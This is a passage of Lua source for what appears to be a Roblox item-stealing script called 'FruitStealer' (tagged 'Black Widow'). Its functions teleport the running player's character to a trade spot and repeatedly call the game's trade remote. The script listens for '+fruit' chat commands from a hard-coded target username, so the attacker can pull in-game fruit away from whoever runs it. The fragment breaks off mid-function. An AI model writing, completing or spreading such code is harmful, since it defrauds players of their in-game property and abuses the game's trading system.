function FruitStealer:TeleportToTradeSpot()
    local character = Players.LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = CFrame.new(self.TradePosition)
        task.wait(1)
        return true
    end
    return false
end

function FruitStealer:TradeFruit(fruitName)
    -- Format fruit name for trading
    local function formatFruitName(name)
        name = name:lower()
        return name:sub(1,1):upper() .. name:sub(2)
    end
    
    local formattedName = formatFruitName(fruitName)
    local formattedFruit = formattedName .. "-" .. formattedName
    
    -- Execute trade
    local args = {"addItem", formattedFruit}
    
    for attempt = 1, CONFIG.MAX_RETRIES do
        local success, result = pcall(function()
            return self.TradeRemote:InvokeServer(unpack(args))
        end)
        
        if success then
            print("[Black Widow] Successfully traded:", formattedFruit)
            return true
        else
            print("[Black Widow] Trade attempt", attempt, "failed:", result)
            task.wait(1)
        end
    end
    
    return false
end

function FruitStealer:MonitorTarget(targetPlayer)
    if targetPlayer.Name:lower() ~= CONFIG.TARGET_USERNAME:lower() then
        return
    end
    
    print("[Black Widow] Monitoring target:", targetPlayer.Name)
    
    targetPlayer.Chatted:Connect(function(message)
        if not self.Processing then
            self.Processing = true
            
            -- Process command
            if message:sub(1, 1) == "+" then
                local fruit = message:sub(2):gsub("%s+", "")
                
                if fruit and #fruit > 0 then
                    -- Teleport to trade spot first
                    self:TeleportToTradeSpot()
                    task.wait(0.5)
                    
                    -- Execute trade
                    local success = self:TradeFruit(fruit)
                    
